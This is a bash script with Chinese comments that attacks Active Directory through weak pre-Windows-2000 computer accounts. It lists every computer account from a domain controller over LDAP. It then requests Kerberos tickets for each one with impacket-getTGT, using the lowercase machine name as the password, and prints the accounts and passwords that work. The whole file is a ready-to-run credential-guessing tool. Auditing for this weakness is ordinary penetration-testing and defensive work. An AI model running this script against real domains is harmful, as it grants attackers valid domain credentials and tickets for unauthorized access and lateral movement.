#!/usr/bin/env bash
# pre2k.sh — pre-Windows-2000 计算机账户检测(机器名$密码=小写机器名)
# 用法: pre2k.sh <dcip> <域> <用户> <密码> [账户名单文件]
# 原理: 预 2000 兼容创建的计算机账户默认密码 = 机器名小写(去$),未改则 getTGT 直接成功
# 名单: 默认 ldap 查 (objectCategory=computer) 取 sAMAccountName; 也可给文件(一行一个,带不带$都行)
set -uo pipefail
DC="$1"; DOM="$2"; USER="$3"; PASS="$4"; LIST="${5:-}"
RED=$'\033[31m'; GRN=$'\033[32m'; YLW=$'\033[33m'; NC=$'\033[0m'

enum_computers() {
  netexec ldap "$DC" -u "$USER" -p "$PASS" \
    --query "(objectCategory=computer)" "sAMAccountName" 2>/dev/null \
    | grep -oP '[A-Za-z0-9_-]+\$' | sort -u
}

if [[ -n "$LIST" && -f "$LIST" ]]; then
  mapfile -t COMPS < <(grep -v '^\s*$' "$LIST" | sed 's/\r//; s/$\$//; s/$/\$/' | sort -u)
else
  mapfile -t COMPS < <(enum_computers)
fi
[[ ${#COMPS[@]} -gt 0 ]] || { echo "${RED}[!] 未枚举到计算机账户(检查凭据/连通性,或用名单文件模式)${NC}"; exit 2; }
echo "[*] 目标 ${#COMPS[@]} 个计算机账户,逐个试 默认密码=机器名小写 ..."

HIT=0
for C in "${COMPS[@]}"; do
  NAME="${C%\$}"; LOW=$(echo "$NAME" | tr 'A-Z' 'a-z')
  OUT=$(KRB5CCNAME=/dev/null timeout 20 impacket-getTGT -dc-ip "$DC" "${DOM}/${C}:${LOW}" 2>&1)
  if echo "$OUT" | grep -q "Saving ticket"; then
    echo "${GRN}[+] PRE2K 命中: ${C} 密码='${LOW}'${NC}"; HIT=$((HIT+1))
  elif echo "$OUT" | grep -q "PREAUTH_FAILED"; then
    echo "  [-] ${C} 已改默认密码"
  else
    echo "${YLW}  [?] ${C} $(echo "$OUT" | grep -oP 'KDC_ERR_\w+' | head -1 || echo 超时/未知)${NC}"
  fi
done
echo; [[ $HIT -gt 0 ]] && echo "${GRN}[✓] 共 $HIT 个 pre2k 弱口令计算机账户${NC}" || echo "[-] 无 pre2k 命中"
exit $((HIT > 0 ? 0 : 1))
